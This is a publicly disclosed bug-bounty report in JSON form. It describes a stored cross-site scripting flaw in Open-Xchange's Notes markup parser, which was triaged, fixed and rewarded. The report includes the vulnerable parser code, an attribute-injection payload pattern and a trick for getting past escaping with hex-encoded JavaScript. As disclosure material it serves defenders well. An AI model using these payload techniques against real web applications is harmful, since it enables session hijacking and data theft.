{"id":995273,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC85OTUyNzM=","url":"https://hackerone.com/reports/995273","title":"XSS - Notes - Attribute injection through overlapping tags","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2020-09-30T22:58:14.293Z","submitted_at":"2020-09-30T22:58:14.360Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"zhutyra","url":"/zhutyra","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":8906,"url":"https://hackerone.com/open-xchange","handle":"open-xchange","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/JtYLEsu5yRZxGitSmAjeAFtK/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/JtYLEsu5yRZxGitSmAjeAFtK/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Open-Xchange","twitter_handle":"openxchange","website":"https://www.open-xchange.com/","about":"Messaging, collaboration and office productivity software for service providers"}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2021-05-01T15:13:28.841Z","bug_reporter_agreed_on_going_public_at":"2021-05-01T15:13:28.782Z","team_member_agreed_on_going_public_at":"2021-04-30T07:43:24.175Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"The `Notes` app uses simple markup language to format the content, which is later converted to HTML for display.\n\n```javascript\n// frontend/ui/apps/io.ox/notes/parser.js\nparsePlainText: function (text) {\n    var lines = _.escape(text).split(/\\n/), openList;\n    ...\n    var html = lines.join('')\n            .replace(/!\\[\\]\\((.*?)\\)/g, '\u003cimg src=\"$1\"\u003e')\n            .replace(/(^|[^\\\\])\\*\\*([^\u003c*]+)\\*\\*/g, '$1\u003cb\u003e$2\u003c/b\u003e')\n            .replace(/(^|[^\\\\])\\*([^\u003c*]+)\\*/g, '$1\u003ci\u003e$2\u003c/i\u003e')\n            .replace(/(^|[^\\\\])_([^\u003c_]+)_/g, '$1\u003cu\u003e$2\u003c/u\u003e')\n            .replace(/(^|[^\\\\])~([^\u003c~]+)~/g, '$1\u003cstrike\u003e$2\u003c/strike\u003e')\n            .replace(/(https?:\\/\\/\\S+)/ig, '\u003ca href=\"$1\" target=\"_blank\" rel=\"noopener\"\u003e$1\u003c/a\u003e')\n            .replace(/\\n/g, '\u003cbr\u003e');\n```\n\nThe problem is that the path to the image in the `img src` attribute can also be a full URL, which will be processed again and replaced by the `a` tag, whose quotation marks will break the quotation and insert additional attributes for the `img` tag.\n\n```\nNote: ![](http://onerror=code;// )\n...\n.replace(/!\\[\\]\\((.*?)\\)/g, '\u003cimg src=\"$1\"\u003e')\nresult: \u003cimg src=\"http://onerror=code;// \"\u003e\n...\n.replace(/(https?:\\/\\/\\S+)/ig, '\u003ca href=\"$1\" target=\"_blank\" rel=\"noopener\"\u003e$1\u003c/a\u003e')\nresult: \u003cimg src=\"\u003ca href=\"http://onerror=code;//\" target=\"_blank\" rel=\"noopener\"\u003ehttp://onerror=code;//\u003c/a\u003e \"\u003e\n```\n\nWhich in a more readable format is this invalid `src` and *almost* arbitrary `onerror` attribute:\n\n```html\n\u003cimg src=\"\u003ca href=\" http:=\"\" onerror=\"code;//\u0026quot;\" target=\"_blank\" rel=\"noopener\"\u003e...\n```\n\nTo overcome the `_.escape` and to not break the markup, the code can be formatted as follows, resulting in arbitrary JavaScript code:\n\n```javascript\nFunction.constructor`\\x41\\x42\\x43`.call``  // ABC in hex\n```\n\nNotes are just plain text files stored in a dedicated folder on the OX Drive, so maybe with file / folder sharing, one user can edit files viewed by someone else, but I haven't explored this scenario. Because it does not require user interaction other than opening Notes, with my current understanding of how things work, it would be much easier to simply redirect a *victim* to *attacker's* Notes.\n\n## Steps to reproduce\n\n* Open the `Notes` app by running this command in the JavaScript console: `ox.launch(\"io.ox/notes/main\")`\n* Go through the Notes setup wizard\n* Switch to `OX Drive` and find the `Notes` folder\n* Upload the attached file F1009653 to any of its subfolders\n* Switch back to `OX Notes` to view the uploaded note\n* JavaScript alert will be displayed\n\nAnother attachment, F1009654, automates this in an attack-like scenario. It only sets up Notes and launches a web server that redirects visitors to the attacker's notes. On the successful XSS, it replaces the OX logo in the upper left corner of the screen with a permanent live clock.\n\n## Impact\n\nAn attacker can execute arbitrary JavaScript in victim's browser and take over their session/data.","bounty_amount":"450.0","formatted_bounty":"$450","weakness":{"id":62,"name":"Cross-site Scripting (XSS) - Stored"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":1009653,"file_name":"xssnote.txt","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/E4yMM8waicVgfn6pp2VA4LXE?response-content-disposition=attachment%3B%20filename%3D%22xssnote.txt%22%3B%20filename%2A%3DUTF-8%27%27xssnote.txt\u0026response-content-type=text%2Fplain\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQQUWX32YR%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T154916Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJIMEYCIQDI60ST6nG4q4laTSFldIqSXi%2FaRkkQyutm5GwT0cJIZgIhAOZhMg3jBlju6Int%2BeeUm1aiBO7rhlrQcLIk%2Bgf6D%2BEDKoMECO%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5IgwXNLBv9MILvVoorSoq1wOfX3WD6Q7XyleYeGc645Essao0xgUb9KvTqDMYcvHVGFjpYncM47xpmv3HMsu%2F5W1XrLh7mNNldxl0sp09zO40TE5Gv3tk2fKUJkR%2FD6XSYmqjjSQ1X8rpbrso174vGjaIUSzY97sO%2Fd37gH6ZpB7ew%2Fv3oEvinQIGLVJR0eRzLhiviACbbOMKLVbWbamWcEPt5JM%2BAi%2F9NdNl7YuEpr2x1Aba%2FQ7SrG7ebdm1DcE0lVqIqx0ztrFvl3nirCMo74N6ge1UFzEhWH44%2BFZEehSLzVwe3%2F%2FBZFO65bGyxbdcPGK84GPYyTmQ%2BjLOaldd7KqAdRhPjDfqVNtwC3oWvVdxRnK%2FoQIrzUgaia36mrU%2B9zb4%2FRhBIhVDxcpxUM1gkKjO26kCJizTpuEecHCYqUizMVCu%2BZHsHDBDtIkkSFfQ%2B2gv2sFyQKltKMSVLAEHz02kDaXPYdZgNpJpJb5mig7chRqoJheUFMk5FqS9E%2FlqeZ5JfW22b6sOCLD%2FEMKSDTLFHVl3btbPUCjyHfhmlMXnpBRHVIqKR1wYVgjD5A7%2FSBEWiHu7RrZzNRZghQJBq1L32qmueS8YHqpboqJLILIuPtnLxC99DFuXuovAM4duMqxEoPDhN0Mw3oyRiwY6pAEUCR%2BsNQPvZhxAQDP4H0mmjcS7kJOELluaCLhnFR0avdVxZaYB9x8Q%2B1vVVuMQVfHNSrjWJl4H%2Be5xJlQ6IIY3JmCIpBdpvoYal7a%2B64IuQyPvQqpHA3Ie7oP5I5O%2F9TxjNDzuk8S48F6Uu5xP3VWBG1thWt0Ez9VpERdwmSl9%2FKYIOOCQmgzrHUQhmsthA0Nah76KucMZDyOmhK8c6RFPBq%2BuQw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=ddd02e215b273437514266aade07034570bb62fcfc05dc417bdc11559bef3410","file_size":111,"type":"text/plain"},{"id":1009654,"file_name":"redirnotes.zip","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/97MWkZRPRg1oqvWphEakLcqX?response-content-disposition=attachment%3B%20filename%3D%22redirnotes.zip%22%3B%20filename%2A%3DUTF-8%27%27redirnotes.zip\u0026response-content-type=application%2Fzip\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQQUWX32YR%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T154916Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJIMEYCIQDI60ST6nG4q4laTSFldIqSXi%2FaRkkQyutm5GwT0cJIZgIhAOZhMg3jBlju6Int%2BeeUm1aiBO7rhlrQcLIk%2Bgf6D%2BEDKoMECO%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5IgwXNLBv9MILvVoorSoq1wOfX3WD6Q7XyleYeGc645Essao0xgUb9KvTqDMYcvHVGFjpYncM47xpmv3HMsu%2F5W1XrLh7mNNldxl0sp09zO40TE5Gv3tk2fKUJkR%2FD6XSYmqjjSQ1X8rpbrso174vGjaIUSzY97sO%2Fd37gH6ZpB7ew%2Fv3oEvinQIGLVJR0eRzLhiviACbbOMKLVbWbamWcEPt5JM%2BAi%2F9NdNl7YuEpr2x1Aba%2FQ7SrG7ebdm1DcE0lVqIqx0ztrFvl3nirCMo74N6ge1UFzEhWH44%2BFZEehSLzVwe3%2F%2FBZFO65bGyxbdcPGK84GPYyTmQ%2BjLOaldd7KqAdRhPjDfqVNtwC3oWvVdxRnK%2FoQIrzUgaia36mrU%2B9zb4%2FRhBIhVDxcpxUM1gkKjO26kCJizTpuEecHCYqUizMVCu%2BZHsHDBDtIkkSFfQ%2B2gv2sFyQKltKMSVLAEHz02kDaXPYdZgNpJpJb5mig7chRqoJheUFMk5FqS9E%2FlqeZ5JfW22b6sOCLD%2FEMKSDTLFHVl3btbPUCjyHfhmlMXnpBRHVIqKR1wYVgjD5A7%2FSBEWiHu7RrZzNRZghQJBq1L32qmueS8YHqpboqJLILIuPtnLxC99DFuXuovAM4duMqxEoPDhN0Mw3oyRiwY6pAEUCR%2BsNQPvZhxAQDP4H0mmjcS7kJOELluaCLhnFR0avdVxZaYB9x8Q%2B1vVVuMQVfHNSrjWJl4H%2Be5xJlQ6IIY3JmCIpBdpvoYal7a%2B64IuQyPvQqpHA3Ie7oP5I5O%2F9TxjNDzuk8S48F6Uu5xP3VWBG1thWt0Ez9VpERdwmSl9%2FKYIOOCQmgzrHUQhmsthA0Nah76KucMZDyOmhK8c6RFPBq%2BuQw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=d3ee913d2954bdcd117011762bee4a8be0acc70b74c9e0f88ae87affc51647ae","file_size":2637,"type":"application/zip"}],"allow_singular_disclosure_at":null,"vote_count":14,"voters":["th3hidd3nmist","ali","0nlymohammed","rzx007x","khizer47","akashhamal0x01","cryptographer","mthrynn","fanat","ghazal1620","and 4 more..."],"severity":{"rating":"medium","score":4.2,"author_type":"Team","metrics":{"attack_vector":"network","attack_complexity":"low","privileges_required":"low","user_interaction":"required","scope":"unchanged","confidentiality":"low","integrity":"none","availability":"none"}},"structured_scope":{"databaseId":43412,"asset_type":"SOURCE_CODE","asset_identifier":"https://github.com/open-xchange/appsuite-frontend","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":9381540,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Thanks for your report, we'll have to check how to handle this as the app is a prototype and some convincing is required to make the victim open it (e.g. run code at the console or click a link).","automated_response":false,"created_at":"2020-10-01T07:49:36.201Z","updated_at":"2020-10-01T07:49:36.201Z","actor":{"username":"mheiland","cleared":false,"url":"/mheiland","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/425JKsXEnCYsDU1VA48SXXZV/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9385242,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello,\n\n* Although it is only a prototype, it is available to everyone.\n* The setup is performed only by the attacker, the victim must only visit a link at any time and will not go through the wizard / tour.\n* I chose the persistent clock demo to show that the victim does not even have to be logged in at the time of the attack and the attacker can take control the next time they log in.\n\nI think it's as serious as any other XSS, but of course I'll respect your decision.\n","automated_response":false,"created_at":"2020-10-01T12:12:03.280Z","updated_at":"2020-10-01T12:12:03.280Z","actor":{"username":"zhutyra","cleared":false,"url":"/zhutyra","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9490715,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","automated_response":false,"created_at":"2020-10-12T08:52:41.944Z","updated_at":"2020-10-12T08:52:41.944Z","actor":{"username":"mheiland","cleared":false,"url":"/mheiland","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/425JKsXEnCYsDU1VA48SXXZV/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"zhutyra","url":"/zhutyra"},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9490722,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":null,"automated_response":false,"created_at":"2020-10-12T08:53:41.062Z","updated_at":"2020-10-12T08:53:41.062Z","additional_data":{"old_severity":"Medium","new_severity":"Medium (4.2)","old_severity_id":861700,"new_severity_id":873574},"actor":{"username":"mheiland","cleared":false,"url":"/mheiland","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/425JKsXEnCYsDU1VA48SXXZV/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9490729,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","automated_response":false,"created_at":"2020-10-12T08:54:18.700Z","updated_at":"2020-10-12T08:54:18.700Z","actor":{"url":"/open-xchange","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/JtYLEsu5yRZxGitSmAjeAFtK/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Open-Xchange"}},"bounty_amount":"450.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"open-xchange","collaborator":{"username":"zhutyra","url":"/zhutyra"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9492464,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thank you very much for the bounty.","automated_response":false,"created_at":"2020-10-12T10:12:07.360Z","updated_at":"2020-10-12T10:12:07.360Z","actor":{"username":"zhutyra","cleared":false,"url":"/zhutyra","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":11574956,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2021-04-30T07:43:24.209Z","updated_at":"2021-04-30T07:43:24.209Z","first_to_agree":true,"actor":{"username":"mheiland","cleared":false,"url":"/mheiland","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/425JKsXEnCYsDU1VA48SXXZV/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":11588349,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2021-05-01T15:13:28.810Z","updated_at":"2021-05-01T15:13:28.810Z","actor":{"username":"zhutyra","cleared":false,"url":"/zhutyra","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":11588350,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2021-05-01T15:13:28.881Z","updated_at":"2021-05-01T15:13:28.881Z","actor":{"username":"zhutyra","cleared":false,"url":"/zhutyra","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}